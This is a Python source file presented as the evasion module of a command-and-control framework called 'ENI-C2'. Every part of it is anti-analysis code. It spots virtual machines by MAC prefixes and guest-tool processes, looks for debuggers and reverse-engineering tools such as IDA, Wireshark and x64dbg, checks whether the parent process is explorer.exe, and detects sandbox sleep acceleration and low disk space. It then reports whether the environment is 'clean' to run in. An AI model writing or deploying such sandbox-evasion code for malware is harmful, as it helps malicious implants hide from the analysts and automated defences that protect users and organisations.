"""
ENI-C2 Evasion Module
Environmental checks to avoid sandboxes, VMs, and analysis.
"""

import os
import sys
import time
import ctypes
import subprocess
from pathlib import Path
from typing import List


class Evasion:
    """Pre-execution environmental awareness."""
    
    # Known sandbox/VM indicators
    VM_MAC_PREFIXES = [
        "00:0C:29", "00:50:56",  # VMware
        "00:1C:42",              # Parallels
        "08:00:27",              # VirtualBox
        "0A:00:27",              # VirtualBox
        "52:54:00",              # QEMU/KVM
    ]
    
    VM_PROC_NAMES = [
        "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
        "vboxtray.exe", "vboxservice.exe",
        "xenservice.exe", "prl_tools.exe",
    ]
    
    SANDBOX_PROCS = [
        "wireshark.exe", "procmon.exe", "procexp.exe",
        "x64dbg.exe", "ollydbg.exe", "ida.exe",
        "ida64.exe", "fiddler.exe", "httpdebugger.exe",
        "dnspy.exe", "de4dot.exe", "apimonitor.exe",
    ]
    
    @staticmethod
    def check_debugger() -> bool:
        """Check for attached debugger via IsDebuggerPresent."""
        if sys.platform == "win32":
            return bool(ctypes.windll.kernel32.IsDebuggerPresent())
        return False
    
    @staticmethod
    def check_parent_process() -> bool:
        """Verify parent is explorer.exe (normal launch)."""
        try:
            import psutil
            parent = psutil.Process(os.getpid()).parent()
            return parent.name().lower() != "explorer.exe"
        except Exception:
            return False
    
    @staticmethod
    def check_vm_processes() -> bool:
        """Check for VM guest tools running."""
        try:
            output = subprocess.check_output("tasklist", shell=True, stderr=subprocess.DEVNULL).decode(errors="ignore").lower()
            return any(p in output for p in Evasion.VM_PROC_NAMES)
        except Exception:
            return False
    
    @staticmethod
    def check_analysis_tools() -> bool:
        """Check for reverse engineering tools."""
        try:
            output = subprocess.check_output("tasklist", shell=True, stderr=subprocess.DEVNULL).decode(errors="ignore").lower()
            return any(p in output for p in Evasion.SANDBOX_PROCS)
        except Exception:
            return False
    
    @staticmethod
    def check_sleep_acceleration() -> bool:
        """Detect sleep acceleration (common in sandboxes)."""
        start = time.perf_counter()
        time.sleep(0.5)
        elapsed = time.perf_counter() - start
        # Real sleep should be ~0.5s; sandboxes often accelerate
        return elapsed < 0.4
    
    @staticmethod
    def check_disk_size() -> bool:
        """VMs often have small virtual disks."""
        try:
            if sys.platform == "win32":
                import ctypes
                free_bytes = ctypes.c_ulonglong(0)
                ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                    None, None, None, ctypes.pointer(free_bytes)
                )
                # Less than 60GB is suspicious
                return free_bytes.value < 60 * 1024**3
        except Exception:
            pass
        return False
    
    @classmethod
    def run_all_checks(cls) -> dict:
        """Run full evasion suite. Returns check results."""
        checks = {
            "debugger": cls.check_debugger(),
            "parent_suspicious": cls.check_parent_process(),
            "vm_detected": cls.check_vm_processes(),
            "analysis_tools": cls.check_analysis_tools(),
            "sleep_accel": cls.check_sleep_acceleration(),
            "small_disk": cls.check_disk_size(),
        }
        checks["clean"] = not any(checks.values())
        return checks